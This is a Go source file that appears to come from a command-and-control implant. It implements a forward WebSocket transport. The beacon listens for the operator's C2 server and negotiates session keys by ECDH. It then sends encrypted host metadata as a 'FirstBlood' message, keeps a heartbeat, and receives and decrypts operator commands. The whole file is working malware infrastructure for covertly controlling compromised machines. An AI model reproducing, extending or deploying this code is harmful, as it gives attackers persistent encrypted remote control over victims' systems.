//go:build transport_ws_forward || transport_multi

package main

import (
	"fmt"
	"implant/core/app"
	"implant/core/communication"
	"implant/core/debuglog"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// NewTransport 构造 ws_forward 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("ws_forward", newWSForwardTransport)
	listenerType = "ws_forward"
}

func newWSForwardTransport() transportClient {
	return &WSForwardClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (c *WSForwardClient) IsConnected() bool { return c.connected }

// ReconnectMgr 返回重连管理器
func (c *WSForwardClient) ReconnectMgr() *reconnect.ReconnectManager { return c.reconnectMgr }

type WSForwardClient struct {
	Listener     net.Listener
	Server       *http.Server
	Connection   *websocket.Conn
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	stopCh       chan struct{}
	recvCh       chan []byte
	doneCh       chan struct{}
	doneOnce     sync.Once
	connectedCh  chan error
	sendMutex    sync.Mutex // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
	upgrader     websocket.Upgrader
}

func (c *WSForwardClient) fail() {
	c.connected = false
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectFailed()
	}
	c.markDone()
}

func (c *WSForwardClient) markDone() {
	c.doneOnce.Do(func() { close(c.doneCh) })
}

// Connect 在 spec（listenAddr:port）上启动 WebSocket 服务（/ws），等待服务端握手连入，
// 然后 FirstBlood + 会话密钥 + 心跳。阻塞直到有服务端连入或出错。
func (c *WSForwardClient) Connect(spec string) error {
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectAttempt()
	}
	// 【重连修复】关闭旧监听器/HTTP服务/旧连接：fail() 只清理连接，runLoop 重连时
	// 旧 Listener 仍占用端口 → net.Listen EADDRINUSE 永久失败
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	c.recvCh = make(chan []byte, 16)
	c.doneCh = make(chan struct{})
	c.doneOnce = sync.Once{}
	c.connectedCh = make(chan error, 1)
	c.upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}

	mux := http.NewServeMux()
	mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		// 会话前 ECDH 交换（场景与反向 ws 相反：这里 **C2 是拨号方**，
		// beacon 是 upgrader）。所以 beacon 在升级请求里读 C2 的公钥、
		// 派生主密钥，并通过升级响应头把自己的公钥回给 C2。
		kxHeader, derivedMK := c.kxRespond(r)
		conn, err := c.upgrader.Upgrade(w, r, kxHeader)
		if err != nil {
			select {
			case c.connectedCh <- err:
			default:
			}
			return
		}
		c.Connection = conn
		c.connected = true
		debuglog.Printf("✅ [WS-FORWARD] 服务端连入: %s\n", conn.RemoteAddr())

		// 交换成功则替换静态主密钥，并作废用静态密钥生成的旧 MetaInfo
		if len(derivedMK) > 0 {
			if rerr := encrypt.GlobalClientKeyManager.ReplaceMasterKey(derivedMK); rerr == nil {
				utils.MetaInfo = nil
				debuglog.Printf("🔑 [WS-FWD-KX] 会话前密钥交换完成，已替换静态主密钥\n")
			}
		}

		// MetaInfo + FirstBlood
		if len(utils.MetaInfo) == 0 {
			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
		}
		if err := c.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
			select {
			case c.connectedCh <- err:
			default:
			}
			return
		}

		// 会话密钥（ws_forward 用占位符 key，与服务端 ws_forward 分支一致）
		salt, masterKey := app.GetListenerKeyConfig("ws_forward")
		if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
			select {
			case c.connectedCh <- err:
			default:
			}
			return
		}
		if c.reconnectMgr != nil {
			c.reconnectMgr.OnReconnectSuccess()
		}

		// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积
		if c.stopCh != nil {
			close(c.stopCh)
		}
		c.stopCh = make(chan struct{})
		stop := c.stopCh
		go app.HeartbeatLoop(stop, c.keepAlive)

		go c.readLoop()
		select {
		case c.connectedCh <- nil:
		default:
		}
	})

	ln, err := net.Listen("tcp", spec)
	if err != nil {
		c.fail()
		return err
	}
	c.Listener = ln
	c.Server = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}
	go func() {
		if err := c.Server.Serve(ln); err != nil && err != http.ErrServerClosed {
			debuglog.Printf("❌ [WS-FORWARD] HTTP 服务退出: %v\n", err)
		}
	}()
	debuglog.Printf("✅ [WS-FORWARD] 监听 %s，等待服务端连接...\n", spec)

	// 阻塞等待服务端连入（与 TCP/KCP 正向 Accept 语义一致）
	err = <-c.connectedCh
	if err != nil {
		c.fail()
		return err
	}
	return nil
}

// readLoop 读取服务端下发的命令：base64(encrypted) 直写，无帧头。
func (c *WSForwardClient) readLoop() {
	for {
		_, data, err := c.Connection.ReadMessage()
		if err != nil {
			debuglog.Printf("❌ [WS-FORWARD] 读取失败: %v\n", err)
			c.fail()
			return
		}
		if len(data) == 0 {
			continue
		}
		rawData, err := encrypt.DecodeBase64(data)
		if err != nil {
			continue
		}
		decrypted, err := communication.DecryptCommand(rawData)
		if err != nil {
			continue
		}
		// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4）
		if decrypted, err = communication.ConsumeSessionNonce(decrypted); err != nil {
			continue
		}
		if decrypted == nil {
			continue
		}
		select {
		case c.recvCh <- decrypted:
		case <-c.doneCh:
			return
		}
	}
}

// Recv 从 recvCh 取一条已解密命令；doneCh 关闭时返回错误。
func (c *WSForwardClient) Recv() ([]byte, error) {
	select {
	case data, ok := <-c.recvCh:
		if !ok {
			return nil, fmt.Errorf("连接关闭")
		}
		return data, nil
	case <-c.doneCh:
		return nil, fmt.Errorf("连接断开")
	}
}

// SendResult 按 WebSocket 分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet（无长度前缀，直接 SendBinaryMessage）。
func (c *WSForwardClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return c.rawSend(msgToSend)
}

func (c *WSForwardClient) rawSend(msg []byte) error {
	c.sendMutex.Lock()
	defer c.sendMutex.Unlock()
	defer func() { _ = recover() }()
	if c.Connection == nil {
		return fmt.Errorf("连接为空")
	}
	return c.Connection.WriteMessage(websocket.BinaryMessage, msg)
}

func (c *WSForwardClient) keepAlive() {
	c.rawSend(communication.HeartbeatMsg())
}

func (c *WSForwardClient) Close() error {
	if c.stopCh != nil {
		close(c.stopCh)
		c.stopCh = nil
	}
	c.markDone()
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	return nil
}

// kxRespond 处理 C2 拨号时带来的 X-Kx 头，返回（要回给 C2 的响应头, 派生主密钥）。
//
// 与反向 ws 的差别：那边是 beacon 读响应头取公钥，这边是 beacon 读**请求头**、
// 并把公钥放进**响应头**。失败时返回空头与 nil —— C2 会回落静态密钥，
// 保持与"老版本不支持 ECDH"一致的行为。
func (c *WSForwardClient) kxRespond(r *http.Request) (http.Header, []byte) {
	hdr := http.Header{}
	raw := r.Header.Get(encrypt.KxHeaderName)
	if raw == "" {
		return hdr, nil
	}
	peerPub, err := encrypt.ParsePeerPublicKey(raw)
	if err != nil {
		debuglog.Printf("⚠️ [WS-FWD-KX] C2 公钥不可用: %v\n", err)
		return hdr, nil
	}
	kx, err := encrypt.NewKeyExchange()
	if err != nil {
		return hdr, nil
	}
	salt, _ := app.GetListenerKeyConfig(listenerType)
	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
	if err != nil {
		debuglog.Printf("⚠️ [WS-FWD-KX] 派生失败: %v\n", err)
		return hdr, nil
	}
	hdr.Set(encrypt.KxHeaderName, kx.HeaderValue())
	return hdr, masterKey
}
